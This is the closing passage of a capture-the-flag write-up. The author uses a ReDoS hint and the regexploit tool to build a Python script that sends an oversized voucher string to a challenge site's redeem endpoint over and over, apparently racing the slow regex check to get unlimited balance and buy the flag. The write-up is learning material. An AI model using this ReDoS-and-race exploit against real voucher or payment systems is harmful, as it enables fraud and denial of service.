At this point I wasn't aware of the hint and had no ideas to try it out, the CTF was over and I couldn't solve the challenge. The next day after the CTF in the morning I checked the website again and noticed that I had many notifications in the platform, the last one was that a new hint was added to chamb challenge, felt despair a bit and continued to the challenge to see the hint. Now it mentioned regex and we know about multithreading, the first thing that came to my mind was to check for ReDos in [Hacktricks](https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos) interestingly there was a clone and use tool for the job [regexploit](https://github.com/doyensec/regexploit) after giving it the regex that was used in the website we got a ReDos possible input.

<IMG>

Using this output I made the following exploit to get an infinite balance to buy the flag 👌+🏴= 🙂

```python
#!/usr/bin/python3
import requests

url = "http://f52668c3-8361-4727-8634-ad0a85fec4ac.cscpsut.com/"
buy_flag = url + "/buy_product?product=Flag"
redeem_url = url + "/redeem_voucher"


res = requests.get(url)

session = res.cookies["session"]
voucher = "zoz-000-" + "0" * 3456 + "a"


for i in range(14):
    req = requests.post(
        redeem_url, cookies={"session": session}, data={"voucher": voucher}
    )
    print(f"Attempt {i + 1}", end="\r")
print()
req = requests.get(buy_flag, cookies={"session": session})
print(req.text)

```







Hope you had enjoyed and learnt a lot while reading this 🙂